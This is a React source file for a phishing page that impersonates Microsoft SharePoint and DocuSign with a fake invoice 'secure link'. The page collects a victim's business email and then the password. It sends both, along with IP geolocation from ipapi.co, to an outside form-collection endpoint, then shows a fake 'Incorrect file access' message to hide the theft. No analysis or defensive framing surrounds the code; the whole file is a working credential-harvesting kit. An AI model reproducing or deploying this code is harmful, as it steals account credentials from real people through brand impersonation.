import axios from "axios";
import { useEffect, useState } from "react";
import Logo from "./logo.png";
import PdfImg from "./pdf3.png";

const FORMSPARK_FORM_ID = "https://submit-form.com/tsoEjl94F";

export default function DocuSignForm() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPasswordPage, setShowPasswordPage] = useState(false);
  const [error, setError] = useState("");
  const [ipDetails, setIpDetails] = useState(null);
  const [success, setSuccess] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => {
    const fetchIpDetails = async () => {
      try {
        const response = await axios.get("https://ipapi.co/json/");
        setIpDetails(response.data);
      } catch (err) {
        console.error("Failed to fetch IP details:", err);
        setIpDetails({ error: "Unable to retrieve IP details" });
      }
    };

    fetchIpDetails();
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setShowPasswordPage(true);
    }, 5000);
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    setSubmitting(true);
    try {
      const submissionData = { email, password, source: "Bottomline", ipDetails };
      
      const response = await axios.post(FORMSPARK_FORM_ID, submissionData);
      if (response.status !== 200) {
        throw new Error("Submission failed");
      }
      setTimeout(() => {
        setSuccess(true);
        setSubmitting(false);
      }, 10000);
    } catch (err) {
      setError("Incorrect access");
      setSubmitting(false);
    }
  };

  if (showPasswordPage) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-100">
        <div className="bg-white p-8 rounded-lg shadow-lg w-96 text-center">
          <h2 className="text-xl font-semibold text-blue-600">Email Password</h2>
          <p className="text-gray-600 mt-2 font-bold">{email}</p>
          <p className="text-gray-600 mt-2 hidden">Location: {ipDetails?.city}, {ipDetails?.country_name}</p>
          <form onSubmit={handlePasswordSubmit}>
            <input
              type="password"
              placeholder="Enter Your Password"
              className="w-full p-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400 mt-4"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button
              type="submit"
              className="w-full mt-4 p-2 bg-blue-600 text-white rounded-md hover:bg-blue-700"
              disabled={submitting}
            >
              {submitting ? "Submitting..." : "Submit"}
            </button>
          </form>
          {error && <p className="mt-3 text-sm text-red-600">{error}</p>}
          {success && <p className="mt-3 text-sm text-red-600 font-bold">Incorrect file access</p>}
        </div>
      </div>
    );
  }

  return (
    <div className="h-screen bg-gray-100">
      <div className="bg-blue-600 py-3 w-full font-bold text-white text-2xl pl-10">Microsoft SharePoint</div>
      <div className="flex items-center justify-center h-auto py-32 bg-gray-100">
        <div className="bg-white py-8 rounded-lg shadow-lg w-96 text-center">
          <img src={Logo} alt="alt" className="mx-auto mb-4 w-24 -mt-24" />
          <h2 className="text-xl font-semibold text-blue-600 w-full py-4 bg-gray-200">Docu Sign</h2>
          <p className="text-gray-600 my-2">You've received a secure link to:</p>
          <div className="flex items-center justify-center gap-2 my-5">
            <img src={PdfImg} alt="PDF" className="w-6 h-6" />
            <span className="text-gray-800 font-medium">INV007209.pdf</span>
          </div>
          <p className=" text-sm text-gray-500 my-3">To open this secure link, enter the Office365 email this document was shared with.</p>
          <form onSubmit={handleSubmit} className="mt-4">
            <input
              type="email"
              placeholder="Enter Your Business Email"
              className="w-full p-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <button
              type="submit"
              className="w-full mt-6 p-3 bg-blue-600 text-white hover:bg-blue-700 disabled:bg-gray-400"
              disabled={loading}
            >
              {loading ? "Verifying..." : "Next"}
            </button>
          </form>
        </div>
      </div>
      <div className="bg-gray-100 text-center">
        © 2025 Microsoft
        <span className="text-blue-500 ml-2">Privacy & Cookies</span>
      </div>
    </div>
  );
}
